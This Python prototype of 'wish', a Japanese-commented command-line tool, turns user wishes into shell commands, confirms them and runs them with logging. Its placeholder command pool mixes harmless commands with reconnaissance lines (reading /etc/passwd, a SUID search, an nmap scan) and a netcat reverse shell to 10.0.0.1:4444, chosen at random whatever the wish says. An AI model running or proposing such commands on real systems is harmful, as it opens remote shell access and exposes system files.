#!/usr/bin/env python3
import json
import os
import random
import subprocess
import sys
import uuid
from datetime import datetime

from wish_models import CommandResult, Wish, WishState

# --------------------
# 事前設定・モデル部分
# --------------------

WISH_HOME = os.path.expanduser("~/.wish")
if not os.path.exists(WISH_HOME):
    os.makedirs(WISH_HOME)
HISTORY_FILE = os.path.join(WISH_HOME, "history.jsonl")


def load_history():
    wishes = []
    if os.path.exists(HISTORY_FILE):
        with open(HISTORY_FILE, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line:
                    data = json.loads(line)
                    wishes.append(Wish.from_dict(data))
    return wishes


def save_to_history(wish_obj):
    with open(HISTORY_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(wish_obj.to_dict(), ensure_ascii=False) + "\n")


def overwrite_history(wishes):
    with open(HISTORY_FILE, "w", encoding="utf-8") as f:
        for w in wishes:
            f.write(json.dumps(w.to_dict(), ensure_ascii=False) + "\n")


def generate_dummy_commands(wish_text):
    """
    wish_text に応じたコマンド候補をランダムに生成（LLM未実装のダミー）
    """
    dummy_pool = [
        "ls -la",
        "pwd",
        "cat /etc/passwd",
        "echo 'Hello World!'",
        "find / -perm -u=s -type f 2>/dev/null",
        "sudo nmap -p- 127.0.0.1",
        "nc -nv 10.0.0.1 4444 -e /bin/bash",
    ]
    num_commands = random.randint(1, 3)
    return random.sample(dummy_pool, num_commands)


def run_command(cmd, wish_id, cmd_index):
    log_dir = os.path.join(WISH_HOME, wish_id, "log")
    os.makedirs(log_dir, exist_ok=True)

    stdout_file = os.path.join(log_dir, f"{cmd_index}.stdout")
    stderr_file = os.path.join(log_dir, f"{cmd_index}.stderr")

    with open(stdout_file, "wb") as out, open(stderr_file, "wb") as err:
        proc = subprocess.Popen(cmd, shell=True, stdout=out, stderr=err)
        proc.wait()

    return proc.returncode, stdout_file, stderr_file


def print_commands(commands):
    print("このコマンドをすべて実行しますか？ [Y/n]")
    for i, cmd in enumerate(commands, 1):
        print(f"[{i}] {cmd}")


def show_wish_detail(wish_obj):
    if not wish_obj.command_results:
        print("このwishにはコマンドがありません。")
        return

    print(f"\nどのコマンドの経過・結果を確認しますか？ (1～{len(wish_obj.command_results)})")
    for i, cr in enumerate(wish_obj.command_results, 1):
        status = "done" if cr.exit_code is not None else "doing"
        print(f"[{i}] cmd: {cr.command} ({status})")

    ans = input("\nwish❓ ").strip()
    if ans.isdigit():
        cmd_idx = int(ans)
        if 1 <= cmd_idx <= len(wish_obj.command_results):
            cr = wish_obj.command_results[cmd_idx - 1]
            if cr.exit_code is None:
                print("まだ実行中、または実行されていません。")
            else:
                print("\n--- stdout (先頭10行) ---")
                if cr.stdout_file and os.path.exists(cr.stdout_file):
                    with open(cr.stdout_file, "r", encoding="utf-8", errors="ignore") as f:
                        for line in f.readlines()[:10]:
                            print(line, end="")
                print("\n--- stderr (先頭10行) ---")
                if cr.stderr_file and os.path.exists(cr.stderr_file):
                    with open(cr.stderr_file, "r", encoding="utf-8", errors="ignore") as f:
                        for line in f.readlines()[:10]:
                            print(line, end="")


def show_wishlist(wishes):
    if not wishes:
        print("まだwishがありません。")
        return None

    print()
    for i, w in enumerate(wishes, 1):
        state_str = w.state
        print(f"[{i}] wish: {w.wish_text} (created: {w.created_at}; state: {state_str})")

    ans = input("\nwish❓ ").strip()
    if ans.isdigit():
        idx = int(ans)
        if 1 <= idx <= len(wishes):
            show_wish_detail(wishes[idx - 1])
    return None


# --------------------
# ステートマシン部 (Shell Turns)
# --------------------


class State:
    IDLE = "idle"
    NEW_WISH = "new_wish"
    EXECUTE_CONFIRMATION = "execute_confirmation"
    SPECIFY_MODIFY = "specify_modify"
    EXECUTE = "execute"
    SHOW_WISHLIST = "show_wishlist"
    EXIT = "exit"


class ShellTurns:
    def __init__(self):
        self.state = State.IDLE
        self.wishes = load_history()
        self.current_wish = None
        self.generated_commands = None
        self.execute_indices = None  # 実行対象のコマンド番号（集合）

    def run(self):
        print("Welcome to wish (prototype with Shell Turns)")
        while self.state != State.EXIT:
            if self.state == State.IDLE:
                self.state_idle()
            elif self.state == State.NEW_WISH:
                self.state_new_wish()
            elif self.state == State.EXECUTE_CONFIRMATION:
                self.state_execute_confirmation()
            elif self.state == State.SPECIFY_MODIFY:
                self.state_specify_modify()
            elif self.state == State.EXECUTE:
                self.state_execute()
            elif self.state == State.SHOW_WISHLIST:
                self.state_show_wishlist()
        print("Bye.")

    def state_idle(self):
        user_input = input("\n$ ").strip()
        if user_input == "":
            self.state = State.NEW_WISH
        elif user_input.lower() == "exit":
            self.state = State.EXIT
        elif user_input.lower() == "wishlist":
            self.state = State.SHOW_WISHLIST
        else:
            # ユーザ入力をそのままwishと解釈
            self.current_wish = Wish.create(user_input)
            self.generated_commands = generate_dummy_commands(user_input)
            self.state = State.EXECUTE_CONFIRMATION

    def state_new_wish(self):
        # 新規wish作成のためwishテキストを入力
        wish_text = input("\nwish✨ ").strip()
        if not wish_text:
            # 空入力ならIDLEへ戻る
            self.state = State.IDLE
            return
        self.current_wish = Wish(wish_text)
        self.generated_commands = generate_dummy_commands(wish_text)
        print_commands(self.generated_commands)
        self.state = State.EXECUTE_CONFIRMATION

    def state_execute_confirmation(self):
        ans = input("\nwish❓ ").strip().lower()
        if ans == "y" or ans == "":
            # 全て実行する場合
            self.execute_indices = set(range(1, len(self.generated_commands) + 1))
            self.state = State.EXECUTE
        elif ans == "n":
            # 部分実行 or 修正
            self.state = State.SPECIFY_MODIFY
        else:
            # 想定外なら再度確認
            print("入力が不正です。もう一度選択してください。")
            self.state = State.EXECUTE_CONFIRMATION

    def state_specify_modify(self):
        print("そのまま実行するコマンドを `1` 、 `1,2` または `1-3` の形式で指定してください。")
        selection = input("\nwish❓ ").strip()
        if not selection:
            self.state = State.IDLE
            return

        indices = set()
        for part in selection.split(","):
            if "-" in part:
                try:
                    start, end = part.split("-")
                    for i in range(int(start), int(end) + 1):
                        indices.add(i)
                except ValueError:
                    continue
            else:
                try:
                    i = int(part)
                    indices.add(i)
                except ValueError:
                    continue

        if not indices:
            print("実行対象が指定されませんでした。")
            self.state = State.IDLE
            return

        self.execute_indices = indices
        print(
            f"\n[{', '.join(map(str, self.execute_indices))}] のみを実行しますか？ [Y] 修正したいコマンドがあればその番号を入力してください。"
        )
        ans = input("\nwish❓ ").strip().lower()
        if ans.isdigit():
            cmd_idx = int(ans)
            if cmd_idx in self.execute_indices:
                print("\n修正内容を指示してください。")
                mod_text = input("wish❓ ").strip()
                # 単純に"-T4"を除去し、末尾にコメントを付加する例
                old_cmd = self.generated_commands[cmd_idx - 1]
                new_cmd = old_cmd.replace("-T4", "")
                if new_cmd == old_cmd:
                    new_cmd += " # " + mod_text
                self.generated_commands[cmd_idx - 1] = new_cmd
                print(f"修正後のコマンド: {new_cmd}")
        # 再確認
        print("\nこのコマンドをすべて実行しますか？ [Y/n]")
        for i, cmd in enumerate(self.generated_commands, 1):
            if i in self.execute_indices:
                print(f"[{i}] {cmd}")
        ans = input("\nwish❓ ").strip().lower()
        if ans == "n":
            print("実行をキャンセルしました。")
            self.state = State.IDLE
        else:
            self.state = State.EXECUTE

    def state_execute(self):
        # 指定されたコマンドを実行
        for idx in sorted(self.execute_indices):
            cmd = self.generated_commands[idx - 1]
            cmd_res = CommandResult(cmd)
            self.current_wish.command_results.append(cmd_res)
            print(f"\nコマンドを実行します: {cmd}")
            rc, out_f, err_f = run_command(cmd, self.current_wish.id, idx)
            cmd_res.exit_code = rc
            cmd_res.stdout_file = out_f
            cmd_res.stderr_file = err_f
            cmd_res.finished_at = datetime.utcnow().isoformat()

        self.current_wish.state = WishState.DONE
        self.current_wish.finished_at = datetime.utcnow().isoformat()
        self.wishes.append(self.current_wish)
        save_to_history(self.current_wish)
        print("wishの実行が完了しました。")
        self.state = State.IDLE

    def state_show_wishlist(self):
        show_wishlist(self.wishes)
        overwrite_history(self.wishes)
        self.state = State.IDLE


# --------------------
# エントリーポイント
# --------------------


def main():
    shell = ShellTurns()
    try:
        shell.run()
    except (KeyboardInterrupt, EOFError):
        print("\nBye.")


if __name__ == "__main__":
    main()
